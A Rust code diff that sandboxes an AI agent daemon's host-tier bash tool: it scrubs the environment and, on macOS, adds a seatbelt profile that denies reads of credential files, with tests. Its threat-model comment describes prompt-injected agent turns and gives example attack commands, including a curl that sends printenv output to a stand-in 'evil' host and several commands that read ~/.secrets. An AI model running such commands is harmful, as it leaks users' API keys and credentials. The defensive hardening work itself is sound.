@@ -110,6 +110,11 @@ impl ToolOrigin {
     }
 }
 
+/// The macOS seatbelt driver. Present on stock macOS; its absence is the
+/// fail-closed trigger for both the jailed tier and the Host-tier `bash` wrap.
+#[cfg(target_os = "macos")]
+pub(crate) const SANDBOX_EXEC_PATH: &str = "/usr/bin/sandbox-exec";
+
 /// Is an OS sandbox backend available on this host?
 ///
 /// Drives the fail-closed decision: when a call *requires* [`Jailed`] but this
@@ -122,7 +127,7 @@ pub fn jail_backend_available() -> bool {
     #[cfg(target_os = "macos")]
     {
         // `sandbox-exec` is the seatbelt entry point; present on stock macOS.
-        Path::new("/usr/bin/sandbox-exec").is_file()
+        Path::new(SANDBOX_EXEC_PATH).is_file()
     }
     #[cfg(target_os = "linux")]
     {
@@ -258,11 +263,12 @@ impl JailedSessionEnv {
 /// down to the shared allowlist (`crate::child_env::scrubbed_child_env`). Each
 /// `K=V` is single-quoted for the outer shell, so an arbitrary value (spaces,
 /// quotes, `$VAR`, backticks) reaches `env` as one exact literal argv element —
-/// `env -i` then applies them as the *complete* environment. This is the macOS
-/// twin of the Linux jail's `env_clear() + envs(scrubbed_child_env())`; because
-/// `env -i` always clears first, even an empty allowlist fails closed (the child
-/// runs with an empty env, never the daemon's secrets).
-#[cfg(target_os = "macos")]
+/// `env -i` then applies them as the *complete* environment. This is the
+/// command-level twin of the Linux jail's `env_clear() + envs(scrubbed_child_env())`;
+/// because `env -i` always clears first, even an empty allowlist fails closed
+/// (the child runs with an empty env, never the daemon's secrets). Used by the
+/// macOS jailed `exec` and by the Host-tier `bash` wrap on both macOS and Linux.
+#[cfg(any(target_os = "macos", target_os = "linux"))]
 fn scrubbed_env_i_prefix() -> String {
     let mut parts = vec!["/usr/bin/env".to_string(), "-i".to_string()];
     let mut pairs: Vec<(String, String)> =
@@ -315,9 +321,194 @@ fn seatbelt_quote(s: &str) -> String {
 }
 
 /// Quote a string for safe inclusion inside a `sh -c` command.
-#[cfg(target_os = "macos")]
+#[cfg(any(target_os = "macos", target_os = "linux"))]
 fn sh_single_quote(s: &str) -> String {
     format!("'{}'", s.replace('\'', "'\\''"))
+}
+
+// ---------------------------------------------------------------------------
+// Host-tier `bash` hardening (C1 env scrub + C2 protected-read deny)
+// ---------------------------------------------------------------------------
+//
+// The Host tier (an owner's interactive turn, `parse_tool_origin(None)`) runs the
+// fluers `bash` tool over the BARE `LocalSessionEnv`: `sh -c <command>` with the
+// daemon's FULL ambient env and NO OS sandbox. That leaves two holes a
+// prompt-injected owner turn can exploit:
+//
+//   * C1 — env exfil: `curl -d "$(printenv)" https://evil` leaks the daemon's
+//     `FAE_OPENROUTER_API_KEY` + ACP keys. (The C1 `env_clear` fix only covered
+//     the JAILED exec path.)
+//   * C2 — protected reads: `cd ~ && cat .secrets`, `cat ~/.sec*`,
+//     `f=.secrets; cat ~/$f`, `tar czf /tmp/x ~` read credential/identity files.
+//     The substring `DamageControlPolicy` gate is trivially evadable; only a
+//     kernel read-deny is sound.
+//
+// [`wrap_host_bash_command`] rewrites the `bash` command so it runs env-scrubbed
+// AND (on macOS) under a seatbelt profile that denies reads of the protected
+// paths, while `(allow default)` keeps legitimate bash working (project files,
+// tools, network, workspace writes). Only `bash` is wrapped — read/write/edit/
+// glob/grep are fluers fd-anchored + path-confined already.
+
+/// Rewrite a Host-tier `bash` command so it runs env-scrubbed and — on macOS —
+/// under a seatbelt profile that denies reads of the protected paths.
+///
+/// `home` is the daemon's resolved home dir (drives the protected-path set).
+///
+/// # macOS
+/// Wraps as `/usr/bin/env -i <allowlist> /usr/bin/sandbox-exec -p <read-deny
+/// profile> /bin/sh -c <original>`. **Fails closed** (`Err`) if `home` is
+/// unknown (the protected set cannot be derived) or if `sandbox-exec` is missing
+/// (the read-deny cannot be enforced) — it NEVER degrades to an unsandboxed exec.
+///
+/// # Linux
+/// Wraps as `/usr/bin/env -i <allowlist> /bin/sh -c <original>`. The env scrub
+/// closes C1. A protected-READ-deny for a general shell is **not expressible in
+/// Landlock** (it is grant-based, not deny-based), so on Linux the read-deny is a
+/// documented residual — the substring `DamageControlPolicy` remains the only read
+/// gate there. This does NOT claim Linux read-deny.
+///
+/// # Errors
+/// A `&'static str` deny-reason label when isolation cannot be enforced (macOS
+/// only); the caller maps it to a fail-closed `Denied`.
+#[cfg(target_os = "macos")]
+pub fn wrap_host_bash_command(command: &str, home: Option<&str>) -> Result<String, &'static str> {
+    // Fail closed: without a home dir the protected set is empty — refuse rather
+    // than run a bash that could read `~/.secrets` unguarded.
+    let Some(home) = home.filter(|h| !h.is_empty()) else {
+        return Err("host_bash_home_unresolved");
+    };
+    // Fail closed: without the seatbelt driver we cannot deny protected reads.
+    if !Path::new(SANDBOX_EXEC_PATH).is_file() {
+        return Err("host_bash_sandbox_unavailable");
+    }
+    let profile = read_deny_seatbelt_profile(home);
+    Ok(format!(
+        "{} {} -p {} /bin/sh -c {}",
+        scrubbed_env_i_prefix(),
+        SANDBOX_EXEC_PATH,
+        sh_single_quote(&profile),
+        sh_single_quote(command),
+    ))
+}
+
+/// Linux variant — env scrub only (see the doc on the macOS variant for why the
+/// read-deny is a documented Linux residual).
+#[cfg(target_os = "linux")]
+pub fn wrap_host_bash_command(command: &str, _home: Option<&str>) -> Result<String, &'static str> {
+    // C1 (env exfil) is closed by `env -i <allowlist>`. C2 (protected reads) is
+    // NOT enforced here: Landlock is grant-based and cannot express a deny-read
+    // for an otherwise-unrestricted shell. The substring `DamageControlPolicy`
+    // remains the read gate on Linux — do NOT claim a kernel read-deny.
+    tracing::warn!(
+        "host bash on Linux: env scrubbed (C1 closed); protected-read deny is a \
+         documented residual (Landlock is grant-based) — substring DamageControl remains"
+    );
+    Ok(format!(
+        "{} /bin/sh -c {}",
+        scrubbed_env_i_prefix(),
+        sh_single_quote(command),
+    ))
+}
+
+/// Unsupported platform — fail closed (parity with the jailed `exec` fallback).
+#[cfg(not(any(target_os = "macos", target_os = "linux")))]
+pub fn wrap_host_bash_command(_command: &str, _home: Option<&str>) -> Result<String, &'static str> {
+    Err("host_bash_unsupported_platform")
+}
+
+/// Home-anchored absolute paths whose file *contents* a Host-tier `bash` is
+/// denied to read. Mirrors the Swift `SafeBashExecutor.protectedReadPaths` /
+/// `DamageControlPolicy` zero-access set (secrets + credential dirs + Fae
+/// identity/backup), kept in sync by hand from the documented protected-path set.
+#[cfg(target_os = "macos")]
+fn protected_read_paths(home: &str) -> Vec<String> {
+    const RELATIVE: &[&str] = &[
+        // Secrets — always zero-access.
+        ".secrets",
+        ".env",
+        ".envrc",
+        ".saorsa-keys",
+        // Cryptographic keys + cloud / network / package credentials.
+        ".ssh",
+        ".gnupg",
+        ".aws",
+        ".azure",
+        ".kube",
+        ".docker/config.json",
+        ".netrc",
+        ".npmrc",
+        ".pypirc",
+        // Fae identity + backup.
+        ".fae-vault",
+        ".fae-vault-dev",
+        "Library/Application Support/fae/speakers.json",
+        "Library/Application Support/fae/directive.md",
+        "Library/Application Support/fae-dev/speakers.json",
+        "Library/Application Support/fae-dev/directive.md",
+    ];
+    let home = home.trim_end_matches('/');
+    RELATIVE.iter().map(|r| format!("{home}/{r}")).collect()
+}
+
+/// Build a seatbelt profile that allows bash to run normally — read project
+/// files, exec tools, use the network, write to the workspace and temp dirs —
+/// but denies reading the *contents* of the protected paths. `(allow default)`
+/// keeps legitimate bash working; the trailing `(deny file-read* …)` rules win
+/// (last match) for the protected subpaths. Both the literal and the canonical
+/// (symlink-resolved) form of each path are emitted so a firmlinked/symlinked
+/// ancestor (`/var` → `/private/var`) cannot slip a protected read past the deny.
+#[cfg(target_os = "macos")]
+fn read_deny_seatbelt_profile(home: &str) -> String {
+    use std::collections::HashSet;
+    let raw = protected_read_paths(home);
+    let mut seen: HashSet<String> = HashSet::new();
+    let mut paths: Vec<String> = Vec::new();
+    for p in &raw {
+        for candidate in [p.clone(), canonical_path(p)] {
+            if seen.insert(candidate.clone()) {
+                paths.push(candidate);
+            }
+        }
+    }
+    let denials = paths
+        .iter()
+        .map(|p| format!("    (subpath {})", seatbelt_quote(p)))
+        .collect::<Vec<_>>()
+        .join("\n");
+    format!(
+        "(version 1)\n\
+         (allow default)\n\
+         (deny file-read*\n{denials}\n)\n"
+    )
+}
+
+/// Resolve `path` to the canonical (fully symlink-resolved) form the kernel
+/// matches sandbox rules against. `canonicalize` needs an existing path, so we
+/// resolve the deepest existing ancestor and re-append the remaining tail — this
+/// handles a protected path that does not yet exist (e.g. no `~/.aws`) and
+/// firmlinked prefixes (`/var` → `/private/var`). Returns the input unchanged if
+/// nothing resolves (fail safe — the raw form is emitted alongside).
+#[cfg(target_os = "macos")]
+fn canonical_path(path: &str) -> String {
+    let mut existing = PathBuf::from(path);
+    let mut tail: Vec<std::ffi::OsString> = Vec::new();
+    while !existing.as_os_str().is_empty() && existing != Path::new("/") && !existing.exists() {
+        match (existing.file_name(), existing.parent()) {
+            (Some(name), Some(parent)) => {
+                tail.insert(0, name.to_os_string());
+                existing = parent.to_path_buf();
+            }
+            _ => break,
+        }
+    }
+    let Ok(resolved) = std::fs::canonicalize(&existing) else {
+        return path.to_string();
+    };
+    let mut out = resolved;
+    for t in tail {
+        out.push(t);
+    }
+    out.to_string_lossy().into_owned()
 }
 
 // ---------------------------------------------------------------------------
@@ -626,6 +817,76 @@ mod tests {
             "__ABSENT__",
             "jailed shell saw the secret (expected sentinel): {:?}",
             result.stdout
+        );
+    }
+
+    // -- macOS Host-tier bash read-deny profile (C2) --
+
+    #[cfg(target_os = "macos")]
+    #[test]
+    fn read_deny_profile_allows_default_and_denies_protected_reads() {
+        let profile = read_deny_seatbelt_profile("/Users/tester");
+        // General allow keeps legitimate bash working.
+        assert!(profile.contains("(allow default)"), "{profile}");
+        // Reads of the protected set are denied (last-match wins).
+        assert!(profile.contains("(deny file-read*"), "{profile}");
+        // Representative protected paths appear as deny subpaths.
+        assert!(
+            profile.contains("(subpath \"/Users/tester/.secrets\")"),
+            "{profile}"
+        );
+        assert!(
+            profile.contains("(subpath \"/Users/tester/.ssh\")"),
+            "{profile}"
+        );
+        assert!(
+            profile.contains(
+                "(subpath \"/Users/tester/Library/Application Support/fae/speakers.json\")"
+            ),
+            "{profile}"
+        );
+        // The profile does NOT globally deny reads (that would break bash).
+        assert!(
+            !profile.contains("(deny file-read*)"),
+            "profile must not deny ALL reads: {profile}"
+        );
+    }
+
+    #[cfg(target_os = "macos")]
+    #[test]
+    fn wrap_host_bash_fails_closed_without_home() {
+        // No home ⇒ the protected set cannot be derived ⇒ refuse (never run an
+        // unguarded bash that could read `~/.secrets`).
+        assert_eq!(
+            wrap_host_bash_command("echo hi", None),
+            Err("host_bash_home_unresolved")
+        );
+        assert_eq!(
+            wrap_host_bash_command("echo hi", Some("")),
+            Err("host_bash_home_unresolved")
+        );
+    }
+
+    #[cfg(target_os = "macos")]
+    #[test]
+    fn wrap_host_bash_wraps_env_scrub_and_sandbox_and_quotes() {
+        // With a home + sandbox-exec present (stock macOS), the wrapper scrubs the
+        // env, invokes the seatbelt driver, and single-quotes the original command.
+        let wrapped =
+            wrap_host_bash_command("cat \"$HOME/.secrets\"", Some("/Users/tester")).expect("wrap");
+        assert!(
+            wrapped.starts_with("/usr/bin/env -i "),
+            "must clear env: {wrapped}"
+        );
+        assert!(
+            wrapped.contains("/usr/bin/sandbox-exec -p "),
+            "must invoke the seatbelt driver: {wrapped}"
+        );
+        // The original command is single-quoted (its embedded double-quotes are
+        // literal, not shell-active).
+        assert!(
+            wrapped.contains("/bin/sh -c 'cat \"$HOME/.secrets\"'"),
+            "original command must be single-quoted verbatim: {wrapped}"
         );
     }
 
